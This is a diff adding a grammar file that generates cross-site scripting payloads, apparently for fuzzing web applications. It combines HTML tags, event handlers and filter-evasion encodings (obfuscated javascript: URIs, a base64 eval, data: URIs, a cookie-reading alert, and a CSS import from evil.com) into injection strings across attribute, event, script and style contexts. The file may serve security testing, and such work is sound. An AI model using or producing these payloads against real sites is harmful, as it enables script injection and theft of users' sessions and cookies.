@@ -1,0 +1,75 @@
+start : attriContext | eventContext | scriptContext | styleContext;
+
+//### Injection Context ###
+attriContext : opLt attributeAttack efilling opEqual efilling jscript lfilling end clickWord | opLt formTag filling tabWord opEqual terDigitOne filling actionAttri efilling opEqual efilling jscript lfilling opGt opLt inputTag filling typeWord opEqual submitWord opGt;
+eventContext : opLt eventHandlerAttack efilling opEqual efilling alertScript lfilling end clickWord;
+scriptContext : opLt scriptTag opGt alertScript opLt sinslash scriptTag opGt;
+styleContext : opLt styleTag opGt cssInjection opLt sinslash styleTag opGt;
+
+//### Attack type ###
+eventHandlerAttack : onToggleTag filling onToggleWord | mouseKeyTag filling editWord filling mouseKeyWord | inputTag filling formWord | buttonTag filling buttonWord | onLoadTag filling onLoadWord | onErrorTag filling srcAttri sinslash typeWord opEqual imageTag filling onLoadWord opEqual sinslash filling onErrorWord | inputTag filling onauxClickWord | animateTag filling onBeginWord | detailsTag filling onToggleWord | dialogTag filling onCloseWord;
+attributeAttack : hrefTag filling hrefAttri | formTag opGt opLt formActionTag filling typeWord opEqual submitWord filling formActionAttri | srcTag filling srcAttri | dataTag filling dataAttri | iframeTag filling srcdocAttri;
+
+//### Tag and KeyWord ###
+imageTag : 'img';
+hrefTag : 'a';
+inputTag : 'input';
+bodyTag : 'body';
+svgTag : 'svg';
+audioTag : 'audio';
+formTag : 'form';
+videoTag : 'video';
+onToggleTag : 'details';
+detailsTag : 'details';
+buttonTag : 'button';
+dataTag : 'object';
+dataAttri : 'data';
+scriptTag : 'script';
+styleTag : 'style';
+animateTag : 'animate';
+dialogTag : 'dialog';
+iframeTag : 'iframe';
+mouseKeyTag : hrefTag | 'a2' | imageTag | inputTag | bodyTag | 'd3v' | svgTag | audioTag | 'audio2' | formTag | videoTag | iframeTag | onToggleTag | 'html' | 'abbr' | 'acronym' | 'address' | animateTag | 'animatemotion' | 'animatetransform' | 'article' | 'aside' | 'b' | 'bdi' | 'bdo' | 'big' | 'blink' | 'blockquote' | 'br' | buttonTag | 'canvas' | 'center' | 'cite' | 'code' | 'content' | 'custom' | dataTag | 'dd' | 'del' | 'dfn' | detailsTag | dialogTag | 'dir' | 'discard' | 'div' | 'dl' | 'dt' | 'element' | 'em' | 'embed' | 'fieldset' | 'figcaption' | 'figure' | 'font' | 'footer' | 'h1' | 'h2' | 'h3' | 'header' | 'hgroup' | 'i' | 'iframe2' | 'image' | 'image2' | 'image3' | 'img2' | 'ins' | 'isindex' | 'kbd' | 'label' | 'legend' | 'li' | 'listing' | 'main' | 'map' | 'mark' | 'marquee' | 'menu' | 'menuitem' | 'meta' | 'multicol' | 'nav' | 'nextid' | 'ol' | 'output' | 'p' | 'picture' | 'plaintext' | 'portal' | 'pre' | 'q' | 'ruby' | 's' | 'samp' | 'section' | 'select' | 'set' | 'shadow' | 'small' | 'source' | 'spacer' | 'span' | 'strike' | 'strong' | 'sub' | 'summary' | 'sup' | 'table' | 'tbody' | 'td' | 'template' | 'textarea' | 'tfoot' | 'th' | 'thead' | 'time' | 'title' | 'tr' | 'track' | 'tt' | 'u' | 'ul' | 'var' | 'wbr' | 'xmp';
+mouseKeyWord : 'onclick' | 'ondblclick' | 'onmouseover' | 'onmousemove' | 'onmouseout' | 'onmouseup' | 'onmousedown' | 'onmouseenter' | 'onmouseleave' | 'onkeydown' | 'onkeyup' | 'onkeypress' | 'onpointerenter' | 'onpointermove' | 'onpointerout' | 'onpointerleave' | 'onpointerdown' | 'onpointerover' | 'onpointerup' | 'onbeforecopy' | 'onbeforecut' | 'onbeforepaste' | 'oncopy' | 'oncut' | 'onpaste' | 'ondrag' | 'ondragend' | 'ondragenter' | 'ondragleave' | 'ondragover' | 'ondragstart' | 'ondrop' | 'onwheel' | 'onscroll' | 'oncontextmenu';
+editWord : 'contenteditable';
+onblurWord : 'onblur';
+onfocusWord : 'onfocus';
+formWord : 'onchange' | 'onselect' | onblurWord | onfocusWord | 'oninput' | 'oninvalid' | 'onreset' | 'onsearch' | 'onsubmit';
+buttonWord : onblurWord | onfocusWord;
+onToggleWord : 'ontoggle';
+onLoadTag : bodyTag | svgTag | iframeTag;
+onLoadWord : 'onload' | 'onpageshow';
+onErrorTag : imageTag | audioTag | bodyTag | inputTag | videoTag | scriptTag | 'link' | 'source' | 'track';
+onErrorWord : 'onerror';
+onauxClickWord : 'onauxclick';
+onBeginWord : 'onbegin';
+onCloseWord : 'onclose';
+clickWord : 'XSS';
+tabWord : 'tabindex';
+hrefAttri : 'href';
+actionAttri : 'action' | 'onsubmit' | onblurWord | onfocusWord;
+formActionTag : buttonTag | inputTag;
+formActionAttri : 'formaction';
+typeWord : 'type';
+submitWord : 'submit';
+srcTag : 'embed' | scriptTag | iframeTag | imageTag;
+srcAttri : 'src';
+srcdocAttri : 'srcdoc';
+
+//### Operators and constants ###
+opLt : '<';
+opGt : '>';
+opEqual : '=';
+alertScript : terDQuote 'alert(XSS)' terDQuote | terDQuote '\u0061lert(XSS)' terDQuote | 'alert(XSS)' | '\u0061lert(XSS)' | 'alert`XSS`' | 'alert(document.domain)' | 'alert(document.cookie)' | 'prompt(XSS)' | 'confirm(XSS)' | 'eval(atob("YWxlcnQoWFNTKQ=="))';
+jscript : terDQuote 'javascript%26%2300058;alert(XSS)' terDQuote | terDQuote 'jav%0Dascript:\u0061lert(XSS)' terDQuote | terDQuote 'jav\u0061script%26colon;alert(XSS)' terDQuote | terDQuote 'java%26Tab;script%26colon;alert(XSS)' terDQuote | terDQuote 'jav%09ascript%26colon;alert(XSS)' terDQuote | terDQuote 'jav%0Dascript%26colon%3B\u0061lert(XSS)' terDQuote | terDQuote 'jav%0Dascript%26colon%3B\u0061lert%26%23x28;XSS%26%23x29;' terDQuote | terDQuote 'jav%09ascript%26colon%3B\u0061lert(XSS)' terDQuote | terDQuote 'jav%26Tab%3Bascript%26colon%3B\u0061lert(XSS)' terDQuote | terDQuote 'jav%09ascript%26colon%3B\u0061lert%26%23x28;XSS%26%23x29;' terDQuote | terDQuote 'jav%26Tab%3Bascript%26colon%3B\u0061lert%26%23x28;XSS%26%23x29;' terDQuote | terDQuote '\u0061lert(XSS)' terDQuote | 'alert(XSS)' | '\u0061lert(XSS)' | terDQuote 'javascript:alert(1)' terDQuote | terDQuote 'javascript:void(0);alert(1)' terDQuote | terDQuote 'data:text/html,<script>alert(XSS)</script>' terDQuote | terDQuote 'data:text/html;base64,PHNjcmlwdD5hbGVydChYU1MpPC9zY3JpcHQ+' terDQuote;
+cssInjection : '@import' terSQuote 'http://evil.com/xss.css' terSQuote terSem | 'expression(alert(XSS))' | 'behavior:url(xss.htc)' | '-moz-binding:url(xss.xml#xss)';
+t1 : '%09';
+lfilling : '%0dx' | '';
+end : opGt | sinslash opGt | sinslash sinslash opGt;
+sinslash : '/';
+filling : t1 | '%0a' | '%0d' | '/+/' | ' ';
+efilling : t1 | '%0a' | '%0d' | '+' | ' ';
+terDQuote : '"' | '%22';
+terSQuote : '\'' | '%27';
+terSem : ';';
+terDigitOne : '1';
